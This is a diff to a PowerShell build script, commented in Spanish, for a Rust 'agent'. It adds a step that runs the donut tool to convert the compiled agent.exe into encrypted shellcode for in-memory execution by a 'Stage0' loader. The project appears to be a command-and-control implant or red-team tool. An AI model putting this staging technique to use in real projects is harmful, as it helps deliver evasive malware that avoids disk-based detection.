@@ -309,6 +309,23 @@ cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-O
 if ($LASTEXITCODE -eq 0) {
     Copy-Item "target\release\agent.exe" "dist\${AgentName}.exe" -Force
     Write-Color "✅ Agent compilado: dist\${AgentName}.exe" Green
+
+    # Convertir agent.exe a shellcode usando donut (para Stage0 in-memory exec)
+    Write-Color "🍩 Convirtiendo agent.exe a shellcode para Stage0..." Cyan
+    $donutExe = Join-Path $PSScriptRoot "donut_v1.1\donut.exe"
+    if (Test-Path $donutExe) {
+        $agentExePath = "dist\${AgentName}.exe"
+        $agentBinPath = "dist\${AgentName}.bin"
+        & $donutExe -a 2 -f 1 -x 1 -e 3 -i $agentExePath -o $agentBinPath 2>&1 | Out-Null
+        if (Test-Path $agentBinPath) {
+            $shellcodeSize = (Get-Item $agentBinPath).Length
+            Write-Color "✅ Agent shellcode: ${agentBinPath} ($shellcodeSize bytes)" Green
+        } else {
+            Write-Color "⚠️  No se pudo generar agent.bin" Yellow
+        }
+    } else {
+        Write-Color "⚠️  donut.exe no encontrado" Yellow
+    }
 } else {
     Write-Color "❌ Error compilando agent" Red
     exit 1
@@ -477,3 +494,4 @@ Write-Color "Para Windows (Agent):" Cyan
 Write-Host "   • Ejecuta: " -NoNewline
 Write-Color "dist\${AgentName}.exe" Green
 Write-Host ""
+
